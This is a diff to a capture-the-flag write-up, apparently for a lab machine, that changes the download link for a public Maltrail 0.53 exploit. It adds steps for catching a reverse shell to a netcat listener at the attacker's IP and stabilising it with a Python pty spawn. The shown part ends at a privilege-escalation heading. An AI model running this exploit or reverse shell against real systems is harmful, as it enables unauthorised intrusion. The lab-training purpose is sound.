@@ -170,7 +170,7 @@ cool, now that we've created a new basket ```bankai```, we can navigate to the u
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/247238d5-085a-4a18-ab2f-19863aded691)
 
-So, we get this webpage powered by ```maltrail 0.53```. This version of ```maltrail``` has a public exploit. You can download it [here](https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py)
+So, we get this webpage powered by ```maltrail 0.53```. This version of ```maltrail``` has a public exploit. You can download it [here](https://www.exploit-db.com/exploits/51676)
 
 Running the downloaded exploit,
 
@@ -184,7 +184,24 @@ command:```python exploit.py 10.10.14.111 1234 http://10.10.11.224:55555/bankai`
 
 Ensure you have a netcat listener running before running the above command,
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/093c4d32-76a5-4cc4-aa28-5b51ca1775ca)
 
+cool stuff, we have a user shell. Lets stabilize this shell
+
+```
+python3 -c “import pty;pty.spawn(‘/bin/bash’)”
+ctrl + z (to background)
+stty raw -echo && fg
+export TERM=xterm
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9627bf9e-df0d-4569-ac5a-2c3188000e7c)
+
+Nice, now lets go ahead and escalate our privileges
+
+
+
+# Privilege Escalation
 
 
 
